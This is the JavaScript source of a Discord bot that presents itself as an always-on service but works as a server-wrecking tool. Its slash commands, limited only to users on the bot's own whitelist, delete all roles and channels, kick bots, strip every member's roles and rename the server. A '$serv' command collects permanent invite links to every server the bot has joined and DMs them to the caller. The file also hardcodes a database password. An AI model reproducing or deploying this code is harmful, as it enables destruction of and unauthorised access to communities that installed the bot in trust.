const express = require("express")
const app = express();
var listener = app.listen(process.env.PORT || 2000, function () {
  console.log('Your app is listening on port ' + listener.address().port);
});
app.listen(() => console.log("I'm Ready To Work..! 24H"));
app.get('/', (req, res) => {
  res.send(`
  <body>
  <center><h1>Bot 24H ON!</h1></center
  </body>`)
});
//====================================  
const db = require('mongoose')
const { Client } = require("discord.js")
const client = new Client({
    intents: 32767,
    partials : ["CHANNEL","GUILD_MEMBER","MESSAGE","REACTION","USER","GUILD_SCHEDULED_EVENT"]
})
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const fs = require('node:fs');
const Data = require('./schemas/users.js')

const token = process.env.token
db.connect("mongodb+srv://hamada:12345Wageh@hamada.6tnetak.mongodb.net/data", {
  keepAlive: true
}).then(() => console.log("database connected!")).catch(err => console.log(err))
db.set('strictQuery', true)
setTimeout(() => {
  if (!client || !client.user) {
    console.log("Client Not Login, Process Kill")
    process.kill(1);
  } else {
    console.log(`${client.user.tag} is Login`)
  }
}, 3*1000*60);

//====================================
// READY
//====================================

client.on('ready', async () => {

    console.log(`logged in successfully as ${client.user.tag}`);

    const commands = [];

    const commandFiles = fs.readdirSync('./Scommands').filter(file => file.endsWith('.js'));
    const clientId = '1053986806787477524';

    for (const file of commandFiles) {
        const command = require(`./Scommands/${file}`);
        commands.push(command.data.toJSON());
    }

    const rest = new REST({ version: '9' }).setToken(token);

    try {
        console.log('Started refreshing application (/) commands.');

        await rest.put(
            Routes.applicationCommands(clientId),
            { body: commands }
        );

        console.log('Successfully reloaded application (/) commands.');

    } catch (error) {
        console.error(error);
    }

});


//====================================
// INTERACTION CREATE
//====================================

client.on('interactionCreate', async interaction => {

    if (!interaction.isCommand()) return;

    const { guild } = interaction;

    try {

        if (interaction.commandName == "roles") {

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) return interaction.reply({
                content: "لايمكنك عمل هذا امر !",
                ephemeral: true
            });

            guild.roles.cache.forEach(async (role) => {
                await role.delete().catch(err => {
                    if (err) return;
                });
            });

            await interaction.reply({
                content: `تم مسح جميع الرولات`,
                ephemeral: true
            }).catch((err) => {
                if (err) return;
            });

        }

        else if (interaction.commandName == "akick") {

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) return interaction.reply({
                content: "لايمكنك عمل هذا امر !",
                ephemeral: true
            });

            guild.members.cache.filter((member) => member.user.bot).forEach(async (bot) => {
                await bot.kick().catch(err => {
                    if (err) return;
                });
            });

            await interaction.reply({
                content: `تم اخراج كل بوتات`,
                ephemeral: true
            }).catch((err) => {
                if (err) return;
            });

        }

        else if (interaction.commandName === "rooms") {

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) {
                return interaction.reply({
                    content: "لايمكنك عمل هذا امر !",
                    ephemeral: true
                });
            }

            for (const [, channel] of interaction.guild.channels.cache) {
                try {
                    await channel.delete();
                } catch (err) {}
            }

            await interaction.guild.channels.create("server", {
                type: "GUILD_TEXT"
            });

            await interaction.reply({
                content: "تم حذف الرومات وإنشاء روم جديد.",
                ephemeral: true
            });

        }

        else if (interaction.commandName === "remove") {

            if (!interaction.member.roles.cache.has("1255590017494155415")) {
                return interaction.reply({
                    content: "You don't have permission!",
                    ephemeral: true
                });
            }

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) return interaction.reply({
                content: "لايمكنك عمل هذا امر !",
                ephemeral: true
            });

            let user = interaction.options.getUser("user");

            let data1 = await Data.findOne({ userId: user.id });

            if (!data1) return interaction.reply({
                content: `هذا الشخص غير مضاف !`,
                ephemeral: true
            });

            await Data.deleteOne({
                userId: user.id
            });

            return interaction.reply({
                content: `تم ازالة <@${user.id}> بنجاح`
            });

        }

        else if (interaction.commandName === "add") {

            if (!interaction.member.roles.cache.has("1255590017494155415")) {
                return interaction.reply({
                    content: "You don't have permission!",
                    ephemeral: true
                });
            }

            let user = interaction.options.getUser("user");

            let data1 = await Data.findOne({ userId: user.id });

            if (data1) {
                return interaction.reply({
                    content: `هذا الشخص مضاف !`,
                    ephemeral: true
                });
            } else {

                await Data.create({
                    userId: user.id
                });

                return interaction.reply({
                    content: `تم اضافة <@${user.id}> بنجاح`,
                    ephemeral: false
                });

            }

        }

        else if (interaction.commandName == "vkick") {

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) return interaction.reply({
                content: "لايمكنك عمل هذا امر !",
                ephemeral: true
            });

            const bots = guild.members.cache.filter((member) => member.user.bot);

            for (const [, bot] of bots) {

                if (bot.user.flags.has("VERIFIED_BOT")) continue;

                await bot.kick().catch(err => {
                    if (err) return;
                });

            }

            await interaction.reply({
                content: `تم اخراج كل بوتات الغير موثوقة`,
                ephemeral: true
            }).catch((err) => {
                if (err) return;
            });

        }

        else if (interaction.commandName === "push") {

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) {
                return interaction.reply({
                    content: "لايمكنك عمل هذا امر !",
                    ephemeral: true
                });
            }

            for (const [, member] of guild.members.cache) {

                try {
                    const roles = member.roles.cache.filter(role => role.id !== guild.id);

                    await member.roles.remove(roles);

                } catch (err) {
                    // تجاهل الأخطاء (مثل رتب أعلى من البوت)
                }

            }

            await interaction.reply({
                content: "تم إزالة جميع الرتب من جميع الأعضاء.",
                ephemeral: true
            });

        }

        else if (interaction.commandName == "all") {

            let data = await Data.findOne({ userId: interaction.user.id });

            if (!data) return interaction.reply({
                content: "لايمكنك عمل هذا امر !",
                ephemeral: true
            });

            // تغيير اسم السيرفر
            await guild.setName("Server").catch(() => {});

            guild.members.cache
                .filter(member => member.user.bot)
                .forEach(async (bot) => {
                    await bot.kick().catch(() => {});
                });

            guild.roles.cache.forEach(async (role) => {
                await role.delete().catch(() => {});
            });

            await interaction.reply({
                content: "تم تغيير اسم السيرفر إلى Server، وإخراج جميع البوتات، ومسح جميع الرولات.",
                ephemeral: true
            }).catch(() => {});

        }

    } catch (error) {

        console.error(error);

        const reply = {
            content: "حدث خطأ أثناء تنفيذ الأمر!",
            ephemeral: true
        };

        if (interaction.replied || interaction.deferred) {
            await interaction.followUp(reply).catch(() => {});
        } else {
            await interaction.reply(reply).catch(() => {});
        }

    }

});


//====================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '$serv') return;
if (!message.member.permissions.has('ADMINISTRATOR')) {
    return message.reply('❌ هذا الأمر خاص بالإداريين فقط!');
}
    const guilds = client.guilds.cache;

    let links = [];

    for (const [id, guild] of guilds) {
        try {
            const channels = guild.channels.cache.filter(channel =>
                channel.type === 'GUILD_TEXT' &&
                channel.permissionsFor(guild.members.me).has('CREATE_INSTANT_INVITE')
            );

            const channel = channels.first();
            if (!channel) continue;

            const invite = await channel.createInvite({
                maxAge: 0,
                maxUses: 0,
                unique: true
            });

            links.push(`**${guild.name}**\n${invite.url}`);
        } catch (err) {
            console.log(`خطأ في ${guild.name}:`, err.message);
        }
    }

    if (links.length === 0) {
        return message.reply('❌ لم أتمكن من إنشاء روابط دعوة.');
    }

    const chunks = [];
    let current = '';

    for (const link of links) {
        if ((current + '\n\n' + link).length > 1900) {
            chunks.push(current);
            current = '';
        }
        current += (current ? '\n\n' : '') + link;
    }

    if (current) chunks.push(current);

    for (const chunk of chunks) {
        await message.author.send(`**🌐 سيرفرات البوت:**\n\n${chunk}`);
    }

    message.reply('✅ تم إرسال روابط السيرفرات في الخاص.');
});


client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '$role') return;
if (!message.member.permissions.has('ADMINISTRATOR')) {
    return message.reply('❌ هذا الأمر خاص بالإداريين فقط!');
}
    const roleId = '1128425653457403974';

    const role = message.guild.roles.cache.get(roleId);

    if (!role) {
        return message.reply('❌ الرتبة غير موجودة!');
    }

    const member = message.member;

    if (member.roles.cache.has(roleId)) {
        return message.reply('❌ أنت تمتلك هذه الرتبة بالفعل!');
    }

    try {
        await member.roles.add(role);
        message.reply(`✅ تم إعطاؤك رتبة ${role.name} بنجاح!`);
    } catch (error) {
        message.reply('❌ لا أستطيع إعطاؤك الرتبة، تأكد من صلاحيات البوت وترتيب الرتب.');
    }
});
//====================================

client.login(token);
